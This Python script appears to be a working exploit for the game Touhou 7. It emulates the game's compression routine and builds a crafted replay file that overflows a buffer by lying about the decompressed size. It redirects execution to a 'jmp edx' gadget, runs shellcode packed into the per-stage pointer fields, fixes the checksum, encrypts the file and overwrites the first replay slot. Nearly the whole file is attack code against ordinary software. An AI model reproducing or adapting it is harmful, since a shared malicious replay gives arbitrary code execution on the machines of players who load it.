import pefile
from unicorn import *
from unicorn.x86_const import *
from typing import *

# Rounds a value up to the next 0x1000 bytes
def round_up_page(val: int) -> int:
    return val - val % -0x1000

# I'm too lazy to reimplement the compression algorithm, so this script just emulates the required function
# It's probably some off-the-shelf algorithm but I wasn't able to find it
def compress_data(game_path: str, data: bytes) -> bytes:
    STACK_ADDR = 0x200000
    STACK_SIZE = 0x10000
    INPUT_ADDR = 0xDEAD0000
    OUTPUT_SIZE_ADDR = 0xBEEF0000
    OUTPUT_ADDR = 0x13370000

    # Initialize Unicorn
    uc = Uc(UC_ARCH_X86, UC_MODE_32)

    # Load the required sections
    # I don't care about proper section protection
    base_addr = 0x400000
    pe = pefile.PE(game_path)
    for x in pe.sections:
        uc.mem_map(base_addr + x.VirtualAddress, round_up_page(x.Misc_VirtualSize))
        uc.mem_write(base_addr + x.VirtualAddress, x.get_data())

    # Allocate a stack
    uc.mem_map(STACK_ADDR - STACK_SIZE, STACK_SIZE)
    uc.mem_write(STACK_ADDR - STACK_SIZE, b"\x00" * STACK_SIZE)

    # Allocate the input buffer
    uc.mem_map(INPUT_ADDR, round_up_page(len(data)))
    uc.mem_write(INPUT_ADDR, data)

    # Allocate a buffer for the function to write the output size
    uc.mem_map(OUTPUT_SIZE_ADDR, round_up_page(4))
    uc.mem_write(OUTPUT_SIZE_ADDR, b"\x00" * 4)

    # Set registers and arguments
    uc.reg_write(UC_X86_REG_ESP, STACK_ADDR - 0x1000) # Stack
    uc.reg_write(UC_X86_REG_ECX, INPUT_ADDR) # Input
    uc.reg_write(UC_X86_REG_EDX, len(data)) # Input length
    uc.mem_write(uc.reg_read(UC_X86_REG_ESP) + 4, int.to_bytes(OUTPUT_SIZE_ADDR, 4, "little"))

    # Set up a hook for intercepting GlobalAlloc since Windows API stuff isn't emulated
    def hook_global_alloc(uc: Uc, instr_address: int, instr_size: int, user_data: Any):
        esp = uc.reg_read(UC_X86_REG_ESP)
        flags = int.from_bytes(uc.mem_read(esp, 4), "little")
        size = int.from_bytes(uc.mem_read(esp + 4, 4), "little")
        uc.reg_write(UC_X86_REG_ESP, esp + 8)
        uc.mem_map(OUTPUT_ADDR, round_up_page(size))
        uc.reg_write(UC_X86_REG_EAX, OUTPUT_ADDR)
        uc.reg_write(UC_X86_REG_EIP, instr_address + instr_size)
    uc.hook_add(UC_HOOK_CODE, hook_global_alloc, None, 0x45EAF6, 0x45EAF6 + 1)

    # Emulate
    uc.emu_start(0x45EAD0, 0x45EEF6)

    # Return the output
    return uc.mem_read(OUTPUT_ADDR, int.from_bytes(uc.mem_read(OUTPUT_SIZE_ADDR, 4), "little"))

if __name__ == "__main__":
    with open("shellcode.bin", "rb") as shellcode_file:
        shellcode = shellcode_file.read()
    assert len(shellcode) <= 7 * 4 * 2

    # Compress the payload
    payload = b"This is some test data. Blah blah blah blah blah bla"
    payload += b"\xEB\x92\x90\x90" # Jump to the per-stage pointers
    payload += int.to_bytes(0x004942E5, 4, "little") # EIP = jmp edx
    compressed = compress_data("th07.exe", payload)

    # Form the replay file
    output = bytearray()
    output += b"T7RP"                                        # 0x00: Header
    output += b"\x00\x11"                                    # 0x04: Version
    output += b"\xCD\x03"                                    # 0x06: Unknown
    output += b"\xAA" * 4                                    # 0x08: Checksum (placeholder)
    output += b"\x02"                                        # 0x0C: Unknown random value
    output += b"\x00"                                        # 0x0D: Encryption seed
    output += b"\x00" * 2                                    # 0x0E: Unknown (padding?)
    output += int.to_bytes(len(payload) + 0x54, 4, "little") # 0x10: Total decompressed size (unused?)
    output += int.to_bytes(len(compressed), 4, "little")     # 0x14: Compressed payload size
    #output += int.to_bytes(len(payload), 4, "little")       # 0x18: Decompressed payload size
    output += b"\x00" * 4                                    # We want to overflow the buffer, so let's lie about the size
    #output += b"\xCC" * 4 * 7                               # 0x1C: Some per-stage pointers
    #output += b"\xCC" * 4 * 7                               # 0x38: More per-stage pointers
    output += shellcode                                      # The shellcode is stuffed into the per-stage pointers
    output += b"\xCC" * (7 * 4 * 2 - len(shellcode))         # Pad accordingly
    output += compressed                                     # Actual overflow stuff
    output += b"\x00" * 0x8000                               # Padding so this conveniently gets loaded in the right spot

    # Calculate the checksum and write it to the replay
    checksum = 0x3F000318
    for i in range(0x0D, len(output)):
        checksum += output[i]
    print("Checksum:", hex(checksum))
    output[0x08:0x0C] = int.to_bytes(checksum, 4, "little")

    # Encrypt the replay file
    state = int(output[0x0D])
    for i in range(0x10, len(output)):
        output[i] = (output[i] + state) % 256
        state += 7

    # Save it (OVERWRITES THE FIRST REPLAY FILE!)
    print("Saved")
    with open("replay/th7_01.rpy", "wb") as replay:
        replay.write(output)
